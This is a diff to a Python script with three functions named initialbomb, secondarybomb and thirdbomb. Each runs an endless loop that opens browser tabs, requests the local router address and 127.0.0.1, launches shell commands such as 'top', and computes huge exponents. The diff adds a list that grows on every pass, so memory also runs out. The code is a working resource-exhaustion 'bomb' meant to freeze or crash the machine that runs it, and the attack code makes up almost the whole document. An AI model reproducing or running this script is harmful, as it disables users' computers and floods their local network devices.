@@ -11,12 +11,14 @@ def initialbomb():
     x+= 1**7
     y = 1**x
     y+=1**2**x
-
+    listy = []
     while True:
         x+=sys.maxunicode**sys.maxsize
+        listy.append(x)
         webbrowser.open_new_tab("https://www.google.com")
         webbrowser.open_new("https://www.google.com")
         urllib.request.urlopen("http://192.168.0.1")
+        urllib.request.urlopen("http://127.0.0.1")
         random.randint(0,1000)
         os.system("echo 11182173272323")
         os.system("top")
@@ -37,12 +39,14 @@ def secondarybomb():
     x+= 1**7
     y = 1**x
     y+=1**2**x
-
+    listy = []
     while True:
         x+=sys.maxunicode**sys.maxsize
+        listy.append(x)
         webbrowser.open_new_tab("https://www.google.com")
         webbrowser.open_new("https://www.google.com")
         urllib.request.urlopen("http://192.168.0.1")
+        urllib.request.urlopen("http://127.0.0.1")
         random.randint(0,1000)
         os.system("echo 11182173272323")
         os.system("top")
@@ -63,12 +67,14 @@ def thirdbomb():
     x+= 1**7
     y = 1**x
     y+=1**2**x
-
+    listy = []
     while True:
         x+=sys.maxunicode**sys.maxsize
+        listy.append(x)
         webbrowser.open_new_tab("https://www.google.com")
         webbrowser.open_new("https://www.google.com")
         urllib.request.urlopen("http://192.168.0.1")
+        urllib.request.urlopen("http://127.0.0.1")
         random.randint(0,1000)
         os.system("echo 11182173272323")
         os.system("top")
